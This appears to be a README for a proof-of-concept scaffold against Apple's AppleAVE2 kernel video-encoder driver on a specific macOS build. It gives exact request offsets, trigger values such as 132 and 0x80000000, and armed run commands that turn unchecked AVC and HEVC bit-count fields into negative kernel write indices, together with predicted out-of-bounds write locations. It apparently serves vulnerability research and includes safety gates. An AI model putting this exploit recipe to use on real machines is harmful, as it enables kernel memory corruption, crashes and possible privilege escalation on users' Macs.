# AppleAVE2 AVC/HEVC signed bit-count PoC scaffold (26A5416b)

This artifact captures the stock `AppleVideoEncoder` selector-4/5 requests and,
only when explicitly armed, changes the unchecked AVC frame-number or POC bit
width byte before the request crosses into `AppleAVE2`.

The interposer is capture-only by default. Mutation is hard-gated to macOS build
`26A5416b`, exact selector input sizes, an `AppleAVE2Driver` connection, and an
explicit arm token. Do not run an armed test on the research host. Tart does not
expose `AppleAVE2Driver`; use a disposable physical Apple-Silicon test Mac.

## Build and capture a valid stock seed

```sh
./build.sh
./run_capture.sh
```

Successful capture should report `hardware encoder=yes` and create exact-size
selector-4/5 `.orig.bin`, `.sent.bin`, and `.meta.txt` files under `artifacts/`.
In capture mode, `.orig.bin` and `.sent.bin` must be identical.

The interposer also classifies the stock encoder's `CodedData`, `CodedHeader`,
`SliceHeader`, and `MBStats` lookup loops by their exact 26A5416b callsites. It
dumps each tracked IOSurface's first and last 64 bytes when the plugin locks and
unlocks it. These snapshots are the cross-surface-write oracle: compare the tail
of `SliceHeader[k-1]` before and after an armed frame targeting
`SliceHeader[k]`.

After a capture or surviving armed run, summarize every changed surface-tail
byte and its offset from the IOSurface base:

```sh
./summarize_surfaces.py artifacts/value-132-frame-*/
```

## Armed one-shot

Start with the frame-number field and value 132. Each test may panic the machine.

```sh
export AVE2_DISPOSABLE_PHYSICAL_MAC=YES
./run_once.sh 132 frame
```

The optional third argument selects the matching selector-call occurrence. Call
2 is useful for a same-type adjacency shot because `SliceHeader[0]` is created
immediately before `SliceHeader[1]`. Call 1 remains useful too: all
`CodedHeader` mappings are created immediately before the `SliceHeader` array,
so `SliceHeader[0]` has the last active `CodedHeader` mapping as its creation
predecessor. The selected output slot is still a driver-managed runtime choice,
so use the captured IDs and snapshots rather than assuming call number equals
slot number.

```sh
./run_once.sh 132 frame 2
```

Values `132..255` make the effective `WriteBits` count negative. The stock slice
builder reaches this field around bit position 2, 4, or 6; value `132` rewinds by
124 bits and the model predicts the first store at `mapping_base-15` or
`mapping_base-16`. Reboot and preserve the panic plus the `artifacts/value-*`
directory after each run.

## Current offsets

```text
selector 4, input 0x12c08: frame 0x1bcc, POC 0x1bce
selector 5, input 0x12c18: frame 0x1bd4, POC 0x1bd6
```

The source offsets are derived from the exact 26A5416b KDK binary and independently
matched against the current stock userland wrapper's fixed call sizes. Re-audit
before changing the build gate.

Run `./model_writer.py` for the position-only model corresponding to the signed
count and the writer's signed-index stores.

## HEVC SPS sibling

The same build contains a stronger 32-bit sibling in HEVC SPS generation. The
HEVC path writes into an embedded `0x800`-byte parameter-set region in the
kernel client object. A user dword is emitted normally as unsigned Exp-Golomb,
then reused as `field + 4` for `WriteBits` without a signed lower bound.

Capture a stock hardware HEVC request without mutation:

```sh
./run_capture_hevc.sh
```

On macOS 27 the encoder plugin runs in a transient `VTEncoderXPCService`, not
in the seed process. `run_capture_hevc.sh` therefore delegates to the
XPC-aware LLDB capture runner. It discovers the new service instance, captures
both exact callsites, and requires every `.orig.bin`/`.sent.bin` pair to be
identical. The old seed-only DYLD interposer is retained for analysis but is
not the active transport on this build.

On a disposable physical Apple-Silicon Mac running exact build `26A5416b`, the
first deterministic armed input is:

```sh
export AVE2_DISPOSABLE_PHYSICAL_MAC=YES
./run_once_hevc.sh 0x80000000 1 4
```

The compatibility entrypoint above delegates to:

```sh
./run_lldb_once_hevc.sh 0x80000000 4 1
```

The armed LLDB runner permanently denies Dawgyg's research-host platform UUID
and additionally requires the exact OS build, AppleVideoEncoder UUID, uid501
target, AppleAVE2Driver presence, explicit disposable-machine marker, exact
selector/size, arm token, and negative post-add SPS value.

The arguments are value, per-selector occurrence, and target selector. Each
armed run mutates exactly one request. If selector 4 returns before SPS
generation, reboot if needed and repeat with selector 5:

```sh
./run_once_hevc.sh 0x80000000 1 5
```

The HEVC interposer forces the existing user-supplied-RPS path, sets the
short-term count to zero and the long-term count to one, then changes only the
unchecked SPS dword. The `0x80000000` input becomes a valid 63-bit unsigned
Exp-Golomb value first, then signed count `-2147483644` at the vulnerable call.
The writer's upper-only signed comparison accepts the resulting negative byte
index. Run `./model_hevc_writer.py` for the arithmetic model. This armed test is
expected to panic and must not be run on the research host.

```text
selector 4, input 0x12c08:
  use supplied RPS 0x18f8, short RPS count 0xce30
  SPS count 0x4874, long-term flag/count/value/used
  0x12898/0x1289c/0x128a0/0x128e0

selector 5, input 0x12c18:
  use supplied RPS 0x1900, short RPS count 0xce38
  SPS count 0x487c, long-term flag/count/value/used
  0x128a0/0x128a4/0x128a8/0x128e8
```
